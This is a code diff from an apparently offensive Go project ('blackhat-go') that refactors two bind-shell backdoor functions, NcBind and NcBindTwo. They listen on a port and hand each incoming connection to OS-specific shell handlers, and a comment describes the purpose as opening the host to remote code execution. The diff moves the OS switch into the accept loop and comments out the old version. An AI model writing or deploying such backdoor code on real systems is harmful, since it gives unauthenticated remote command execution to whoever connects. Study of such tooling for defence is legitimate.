@@ -1,13 +1,12 @@
 package serverbind
 
 import (
-	"blackhat-go/scannertools"
+	"blackhat-go/backdoor/scannertools"
 	"bufio"
 	"fmt"
 	"io"
 	"log"
 	"net"
-	"os"
 	"os/exec"
 	"runtime"
 )
@@ -33,29 +32,46 @@ func (uin *ServerBindUserInputNetcat) NcBindTwo() {
 	if err != nil {
 		log.Fatalf("Unable to bind to port %s", address)
 	}
-	switch osRuntime {
-	case "linux":
-		for {
-			conn, err := listener.Accept()
-			log.Printf("Received connection from %s!\n", conn.RemoteAddr().String())
-			if err != nil {
-				log.Fatalln("Unable to accept connection.")
-			}
+	for {
+		conn, err := listener.Accept()
+		log.Printf("Received connection from %s!\n", conn.RemoteAddr().String())
+		if err != nil {
+			log.Fatalln("Unable to accept connection.")
+		}
+		switch osRuntime {
+		case "linux":
 			go SimpleHandleLinux(conn)
-		}
-	case "windows":
-		for {
-			conn, err := listener.Accept()
-			log.Printf("Received connection from %s!\n", conn.RemoteAddr().String())
-			if err != nil {
-				log.Fatalln("Unable to accept connection.")
-			}
+		case "windows":
 			go SimpleHandleWindows(conn)
+		default:
+			log.Fatalf("Unsupported OS, report bug for %s\n", osRuntime)
+			// fmt.Printf("Unsupported OS, report bug for %s\n", osRuntime)
+			// os.Exit(1)
 		}
-	default:
-		fmt.Printf("Unsupported OS, report bug for %s\n", osRuntime)
-		os.Exit(1)
 	}
+	// switch osRuntime {
+	// case "linux":
+	// 	for {
+	// 		conn, err := listener.Accept()
+	// 		log.Printf("Received connection from %s!\n", conn.RemoteAddr().String())
+	// 		if err != nil {
+	// 			log.Fatalln("Unable to accept connection.")
+	// 		}
+	// 		go SimpleHandleLinux(conn)
+	// 	}
+	// case "windows":
+	// 	for {
+	// 		conn, err := listener.Accept()
+	// 		log.Printf("Received connection from %s!\n", conn.RemoteAddr().String())
+	// 		if err != nil {
+	// 			log.Fatalln("Unable to accept connection.")
+	// 		}
+	// 		go SimpleHandleWindows(conn)
+	// 	}
+	// default:
+	// 	fmt.Printf("Unsupported OS, report bug for %s\n", osRuntime)
+	// 	os.Exit(1)
+	// }
 }
 
 // Bind to local port, open up host to remote code execution
@@ -70,29 +86,46 @@ func NcBind(mappedUserInput map[string]string) {
 	if err != nil {
 		log.Fatalf("Unable to bind to port %s", address)
 	}
-	switch osRuntime {
-	case "linux":
-		for {
-			conn, err := listener.Accept()
-			log.Printf("Received connection from %s!\n", conn.RemoteAddr().String())
-			if err != nil {
-				log.Fatalln("Unable to accept connection.")
-			}
+	for {
+		conn, err := listener.Accept()
+		log.Printf("Received connection from %s!\n", conn.RemoteAddr().String())
+		if err != nil {
+			log.Fatalln("Unable to accept connection.")
+		}
+		switch osRuntime {
+		case "linux":
 			go SimpleHandleLinux(conn)
-		}
-	case "windows":
-		for {
-			conn, err := listener.Accept()
-			log.Printf("Received connection from %s!\n", conn.RemoteAddr().String())
-			if err != nil {
-				log.Fatalln("Unable to accept connection.")
-			}
+		case "windows":
 			go SimpleHandleWindows(conn)
+		default:
+			log.Fatalf("Unsupported OS, report bug for %s\n", osRuntime)
+			// fmt.Printf("Unsupported OS, report bug for %s\n", osRuntime)
+			// os.Exit(1)
 		}
-	default:
-		fmt.Printf("Unsupported OS, report bug for %s\n", osRuntime)
-		os.Exit(1)
 	}
+	// switch osRuntime {
+	// case "linux":
+	// 	for {
+	// 		conn, err := listener.Accept()
+	// 		log.Printf("Received connection from %s!\n", conn.RemoteAddr().String())
+	// 		if err != nil {
+	// 			log.Fatalln("Unable to accept connection.")
+	// 		}
+	// 		go SimpleHandleLinux(conn)
+	// 	}
+	// case "windows":
+	// 	for {
+	// 		conn, err := listener.Accept()
+	// 		log.Printf("Received connection from %s!\n", conn.RemoteAddr().String())
+	// 		if err != nil {
+	// 			log.Fatalln("Unable to accept connection.")
+	// 		}
+	// 		go SimpleHandleWindows(conn)
+	// 	}
+	// default:
+	// 	fmt.Printf("Unsupported OS, report bug for %s\n", osRuntime)
+	// 	os.Exit(1)
+	// }
 }
 
 // Flusher wraps bufio.Writer, explicitly flushing on all writes
